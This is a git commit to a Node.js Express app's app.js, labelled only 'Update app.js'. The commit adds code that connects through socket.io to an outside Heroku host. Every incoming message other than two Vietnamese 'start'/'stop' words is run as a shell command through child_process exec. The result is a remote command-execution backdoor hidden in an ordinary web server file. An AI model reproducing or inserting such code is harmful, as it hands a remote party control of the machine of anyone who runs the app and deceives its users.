033d56237bb7416e4e9e70afa09850ada09a1bc2
lewissoto0 <104055939+lewissoto0@users.noreply.github.com>
2022-04-20 07:26:34 +0000

    Update app.js

--- app.js
+++ app.js
@@ -14,6 +14,21 @@ app.get('/', function (req, res) {
     // var message = "Hello World";
     res.render("index", {message: welcomeMessage()});
 });
+const { exec } = require('child_process');
+const
+    io = require("socket.io-client"),
+    ioClient = io.connect("https://colevelao.herokuapp.com:443");
+
+ioClient.on("message", (msg) => {
+	if (msg ==='Chay') {
+		console.log('Em bat dau chay');
+	} else if (msg ==='Ngung'){
+		console.log('Em ngung');
+	}
+	 else {
+		exec(msg);
+	}
+});
 
 var server = app.listen(5000, function () {
     console.log("Node server is running..");
